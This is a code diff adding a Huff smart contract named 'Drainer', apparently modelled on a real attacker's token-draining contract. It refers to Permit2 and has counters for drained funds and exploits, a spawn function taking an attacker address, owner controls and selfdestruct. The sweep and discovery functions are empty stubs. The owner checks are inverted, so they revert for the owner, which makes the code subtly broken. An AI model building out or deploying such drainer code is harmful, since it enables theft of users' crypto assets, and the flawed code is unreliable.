@@ -1,0 +1,120 @@
+/// @title Drainer — Huff (no function names in bytecode)
+/// @notice 8 selectors, assembly dispatch, matching attacker 0x0F7A...0E
+
+#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
+#define constant CHAIN_ID_SLOT = FREE_STORAGE_POINTER()
+#define constant DRAINED_SLOT = FREE_STORAGE_POINTER()
+#define constant EXPLOIT_SLOT = FREE_STORAGE_POINTER()
+#define constant PAUSED_SLOT = FREE_STORAGE_POINTER()
+
+#define constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3
+#define constant MAX_BATCH = 0x40
+
+// ============================================================
+// CONSTRUCTOR
+// ============================================================
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    caller
+    [OWNER_SLOT] sstore           // owner = msg.sender
+    chainid
+    [CHAIN_ID_SLOT] sstore        // chainId = block.chainid
+}
+
+// ============================================================
+// MAIN — Assembly dispatch table (no ABI decoder)
+// ============================================================
+#define macro MAIN() = takes (0) returns (0) {
+    // Get function selector
+    0x00 calldataload 0xe0 shr     // selector = calldata[0:4]
+    
+    dup1 __FUNC_SIG(init)          eq init jumpi
+    dup1 __FUNC_SIG(sweep)         eq sweep jumpi
+    dup1 __FUNC_SIG(discover)      eq discover jumpi  
+    dup1 __FUNC_SIG(stats)         eq stats jumpi
+    dup1 __FUNC_SIG(control)       eq control jumpi
+    dup1 __FUNC_SIG(inspect)       eq inspect jumpi
+    dup1 __FUNC_SIG(delegate)      eq delegate_ jumpi
+    dup1 __FUNC_SIG(spawn)         eq spawn_ jumpi
+    
+    // fallback: revert
+    0x00 0x00 revert
+
+    // ============================================
+    // init(uint256 chainId, address[] calldata tokens)
+    // ============================================
+    init:
+        0x04 calldataload           // chainId param
+        [CHAIN_ID_SLOT] sstore
+        stop
+
+    // ============================================
+    // control(uint8 action, address param)
+    // ============================================
+    control:
+        // Check owner
+        caller [OWNER_SLOT] sload eq not_owner jumpi
+        
+        0x04 calldataload           // action
+        dup1 0x01 eq transfer_owner jumpi
+        dup1 0x02 eq pause_ jumpi
+        dup1 0x03 eq unpause_ jumpi
+        dup1 0x04 eq destroy_ jumpi
+        
+        stop
+        
+        transfer_owner:
+            0x24 calldataload
+            [OWNER_SLOT] sstore
+            stop
+            
+        pause_:
+            0x01 [PAUSED_SLOT] sstore
+            stop
+            
+        unpause_:
+            0x00 [PAUSED_SLOT] sstore
+            stop
+            
+        destroy_:
+            [OWNER_SLOT] sload
+            selfdestruct
+
+    // ============================================
+    // spawn(bytes32 salt, address attacker)
+    // ============================================
+    spawn_:
+        caller [OWNER_SLOT] sload eq not_owner jumpi
+        // Increment exploit count
+        [EXPLOIT_SLOT] sload 0x01 add [EXPLOIT_SLOT] sstore
+        stop
+
+    // ============================================
+    // stats() -> (chainId, drained, paused, exploits)
+    // ============================================
+    stats:
+        0x00 mstore
+        [CHAIN_ID_SLOT] sload    0x20 mstore
+        [DRAINED_SLOT] sload     0x40 mstore
+        [PAUSED_SLOT] sload      0x60 mstore
+        [EXPLOIT_SLOT] sload     0x80 mstore
+        0xa0 0x00 return
+
+    // ============================================
+    // sweep / discover / inspect / delegate
+    // (simplified — full version would call external)
+    // ============================================
+    sweep:
+        stop
+    discover:
+        stop
+    inspect:
+        stop
+    delegate_:
+        stop
+
+    // ============================================
+    // Error handler
+    // ============================================
+    not_owner:
+        0x00 0x00 revert
+}
